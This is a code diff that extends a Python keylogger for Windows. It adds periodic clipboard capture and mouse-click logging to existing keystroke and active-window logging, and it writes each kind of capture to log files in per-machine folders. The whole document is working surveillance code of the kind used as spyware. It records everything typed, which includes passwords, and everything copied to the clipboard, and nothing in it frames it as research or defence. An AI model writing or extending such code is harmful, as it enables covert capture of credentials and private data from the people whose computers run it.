@@ -7,6 +7,7 @@ import sys
 import importlib.util
 
 user32 = ctypes.WinDLL('user32', use_last_error=True)
+kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
 
 GetAsyncKeyState = user32.GetAsyncKeyState
 GetAsyncKeyState.argtypes = [ctypes.c_int]
@@ -44,6 +45,33 @@ GetWindowTextLength.restype = ctypes.c_int
 GetWindowText = user32.GetWindowTextW
 GetWindowText.argtypes = [w.HWND, w.LPWSTR, ctypes.c_int]
 GetWindowText.restype = ctypes.c_int
+
+OpenClipboard = user32.OpenClipboard
+OpenClipboard.argtypes = [w.HWND]
+OpenClipboard.restype = ctypes.c_bool
+
+EmptyClipboard = user32.EmptyClipboard
+EmptyClipboard.argtypes = []
+EmptyClipboard.restype = ctypes.c_bool
+
+GetClipboardData = user32.GetClipboardData
+GetClipboardData.argtypes = [ctypes.c_uint]
+GetClipboardData.restype = w.HANDLE
+
+CloseClipboard = user32.CloseClipboard
+CloseClipboard.argtypes = []
+CloseClipboard.restype = ctypes.c_bool
+
+GlobalLock = kernel32.GlobalLock
+GlobalLock.argtypes = [w.HANDLE]
+GlobalLock.restype = ctypes.c_void_p
+
+GlobalUnlock = kernel32.GlobalUnlock
+GlobalUnlock.argtypes = [w.HANDLE]
+GlobalUnlock.restype = ctypes.c_bool
+
+CF_TEXT = 1
+CF_UNICODETEXT = 13
 
 VK_LBUTTON = 0x01
 VK_RBUTTON = 0x02
@@ -98,7 +126,9 @@ VK_LMENU = 0xA4
 VK_RMENU = 0xA5
 
 VK_TO_NAME = {
-    VK_LBUTTON: "VK_LBUTTON", VK_RBUTTON: "VK_RBUTTON", VK_BACK: "VK_BACK", VK_TAB: "VK_TAB",
+    VK_LBUTTON: "VK_LBUTTON", VK_RBUTTON: "VK_RBUTTON", VK_MBUTTON: "VK_MBUTTON",
+    VK_XBUTTON1: "VK_XBUTTON1", VK_XBUTTON2: "VK_XBUTTON2",
+    VK_BACK: "VK_BACK", VK_TAB: "VK_TAB",
     VK_RETURN: "VK_RETURN", VK_SHIFT: "VK_SHIFT", VK_CONTROL: "VK_CONTROL", VK_MENU: "VK_MENU",
     VK_ESCAPE: "VK_ESCAPE", VK_SPACE: "VK_SPACE", VK_PRIOR: "VK_PRIOR", VK_NEXT: "VK_NEXT",
     VK_END: "VK_END", VK_HOME: "VK_HOME", VK_LEFT: "VK_LEFT", VK_UP: "VK_UP",
@@ -112,7 +142,7 @@ for i in range(VK_F1, VK_F24 + 1):
     VK_TO_NAME[i] = f"VK_F{i - VK_F1 + 1}"
 for i in range(VK_NUMPAD0, VK_NUMPAD9 + 1):
     VK_TO_NAME[i] = f"VK_NUMPAD{i - VK_NUMPAD0}"
-    
+   
 INTERVAL_MS = 20
 DEBUG = False
 
@@ -132,17 +162,31 @@ else:
     pc_logger = importlib.util.module_from_spec(spec)
     spec.loader.exec_module(pc_logger)
     get_pc_log_folder = pc_logger.get_pc_log_folder   # <-- the function we need
-
-
 # ----------------------------------------------------------------------
 # 2. Determine the per-PC log folder (creates it if needed)
 # ----------------------------------------------------------------------
 log_dir = get_pc_log_folder(create_if_missing=True)   # <-- creates …/machine-ids/<PCNAME>/
 os.makedirs(log_dir, exist_ok=True)                  # safety net
-LOG_FILE = os.path.join(log_dir, "key_logs.log")
+KEY_LOG_FILE = os.path.join(log_dir, "key_logs.log")
+MOUSE_LOG_FILE = os.path.join(log_dir, "mouse_logs.log")
+CLIPBOARD_LOG_FILE = os.path.join(log_dir, "clipboard.log")
 
 last_key_state = bytearray(256)
 last_active_window = ""
+last_clipboard_check = 0
+last_clipboard_content = ""
+
+def get_clipboard_text():
+    text = ""
+    if OpenClipboard(None):
+        hData = GetClipboardData(CF_UNICODETEXT)
+        if hData:
+            data = GlobalLock(hData)
+            if data:
+                text = ctypes.wstring_at(data)
+                GlobalUnlock(hData)
+        CloseClipboard()
+    return text
 
 def get_char_from_vk(vk, keyboard_state):
     scan_code = MapVirtualKey(vk, 0)
@@ -155,6 +199,8 @@ def get_char_from_vk(vk, keyboard_state):
 
 def get_special_char(vk):
     specials = {
+        VK_LBUTTON: "[LEFT CLICK]", VK_RBUTTON: "[RIGHT CLICK]", VK_MBUTTON: "[MIDDLE CLICK]",
+        VK_XBUTTON1: "[X BUTTON 1]", VK_XBUTTON2: "[X BUTTON 2]",
         VK_RETURN: "[ENTER]", VK_BACK: "[BACKSPACE]", VK_SPACE: " ", VK_TAB: "[TAB]",
         VK_ESCAPE: "[ESC]", VK_INSERT: "[INSERT]", VK_DELETE: "[DELETE]",
         VK_HOME: "[HOME]", VK_END: "[END]", VK_PRIOR: "[PAGE UP]", VK_NEXT: "[PAGE DOWN]",
@@ -184,7 +230,7 @@ def test_all_keys():
     print("This will simulate pressing every virtual key (0x01-0xFF).")
     print("This does NOT physically press keys on your keyboard.")
 
-    with open(LOG_FILE, "a", encoding="utf-8") as f:
+    with open(KEY_LOG_FILE, "a", encoding="utf-8") as f:
         f.write(f"\n\n--- DEBUG MODE TEST START: {datetime.now():%Y-%m-%d %H:%M:%S} ---\n")
 
     modifier_states = {
@@ -199,7 +245,7 @@ def test_all_keys():
 
     for mod_name, mods in modifier_states.items():
         print(f"\nTesting with modifiers: {mod_name}")
-        with open(LOG_FILE, "a", encoding="utf-8") as f:
+        with open(KEY_LOG_FILE, "a", encoding="utf-8") as f:
             f.write(f"\n[DEBUG] Testing with modifiers: {mod_name}\n")
 
         mock_state = bytearray(256)
@@ -212,38 +258,47 @@ def test_all_keys():
         mock_state[VK_CAPITAL] = 0x01
 
         for vk in range(0x01, 0x100):
-            if VK_LBUTTON <= vk <= VK_XBUTTON2:
-                continue
-
             is_pressed = True
             was_pressed = last_key_state[vk] != 0
 
             if is_pressed and not was_pressed:
                 char = get_special_char(vk)
-                if not char and vk not in {VK_SHIFT, VK_CONTROL, VK_MENU, VK_LWIN, VK_RWIN, VK_APPS}:
+                if not char and vk not in {VK_SHIFT, VK_CONTROL, VK_MENU, VK_LWIN, VK_RWIN, VK_APPS, VK_LBUTTON, VK_RBUTTON, VK_MBUTTON, VK_XBUTTON1, VK_XBUTTON2}:
                     char = get_char_from_vk(vk, mock_state)
                 char_display = char if char else "[NO CHAR]"
                 key_name = VK_TO_NAME.get(vk, f"0x{vk:02X}")
                 log_entry = f"[DEBUG] {key_name} (VK: 0x{vk:02X}) - Detected: {char_display}"
-                with open(LOG_FILE, "a", encoding="utf-8") as f:
+                with open(KEY_LOG_FILE, "a", encoding="utf-8") as f:
                     f.write(log_entry + "\n")
             last_key_state[vk] = 0x80 if is_pressed else 0
 
         last_key_state = bytearray(256)
 
-    with open(LOG_FILE, "a", encoding="utf-8") as f:
+    with open(KEY_LOG_FILE, "a", encoding="utf-8") as f:
         f.write(f"\n--- DEBUG MODE TEST END: {datetime.now():%Y-%m-%d %H:%M:%S} ---\n")
     print("--- DEBUG MODE TEST COMPLETE ---")
     sys.exit(0)
 
 def start_logger():
-    global last_active_window, last_key_state
+    global last_active_window, last_key_state, last_clipboard_check, last_clipboard_content
     print("Starting.. Press Ctrl+C to stop.")
-    print(f"Outputting to: {LOG_FILE}")
+    print(f"Key logs to: {KEY_LOG_FILE}")
+    print(f"Mouse logs to: {MOUSE_LOG_FILE}")
+    print(f"Clipboard logs to: {CLIPBOARD_LOG_FILE}")
 
     try:
         while True:
             time.sleep(INTERVAL_MS / 1000.0)
+
+            current_time = time.time()
+            if current_time - last_clipboard_check >= 60:  # Every 1 minute
+                clipboard_content = get_clipboard_text()
+                if clipboard_content != last_clipboard_content and clipboard_content:
+                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                    with open(CLIPBOARD_LOG_FILE, "a", encoding="utf-8") as f:
+                        f.write(f"[{timestamp}] Clipboard: {clipboard_content}\n")
+                    last_clipboard_content = clipboard_content
+                last_clipboard_check = current_time
 
             hwnd = GetForegroundWindow()
             if hwnd:
@@ -254,7 +309,9 @@ def start_logger():
                     current_window = buffer.value
                     if current_window != last_active_window:
                         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                        with open(LOG_FILE, "a", encoding="utf-8") as f:
+                        with open(KEY_LOG_FILE, "a", encoding="utf-8") as f:
+                            f.write(f"\n\n[{timestamp}] Active Window: {current_window}\n")
+                        with open(MOUSE_LOG_FILE, "a", encoding="utf-8") as f:
                             f.write(f"\n\n[{timestamp}] Active Window: {current_window}\n")
                         last_active_window = current_window
 
@@ -267,11 +324,17 @@ def start_logger():
 
                 if is_pressed and not was_pressed:
                     char = get_special_char(vk)
-                    if not char:
-                        char = get_char_from_vk(vk, kb_state)
-                    if char:
-                        with open(LOG_FILE, "a", encoding="utf-8") as f:
-                            f.write(char)
+                    if vk in {VK_LBUTTON, VK_RBUTTON, VK_MBUTTON, VK_XBUTTON1, VK_XBUTTON2}:
+                        if char:
+                            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                            with open(MOUSE_LOG_FILE, "a", encoding="utf-8") as f:
+                                f.write(f"[{timestamp}] {char}\n")
+                    else:
+                        if not char:
+                            char = get_char_from_vk(vk, kb_state)
+                        if char:
+                            with open(KEY_LOG_FILE, "a", encoding="utf-8") as f:
+                                f.write(char)
 
                 last_key_state[vk] = 0x80 if is_pressed else 0
 
